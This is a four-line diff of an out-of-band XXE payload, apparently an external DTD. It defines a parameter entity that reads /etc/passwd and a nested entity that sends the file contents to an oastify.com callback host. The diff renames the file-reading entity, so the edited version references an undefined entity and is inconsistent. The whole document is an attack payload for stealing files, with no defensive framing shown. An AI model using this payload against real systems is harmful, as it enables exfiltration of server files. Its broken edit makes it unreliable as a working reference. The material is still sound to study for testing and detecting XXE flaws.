@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; xxe SYSTEM 'https://806lh6u8y13gyex1byfjyggfl6rxfn3c.oastify.com/?x=%file;'>">
 %eval;
 %xxe;
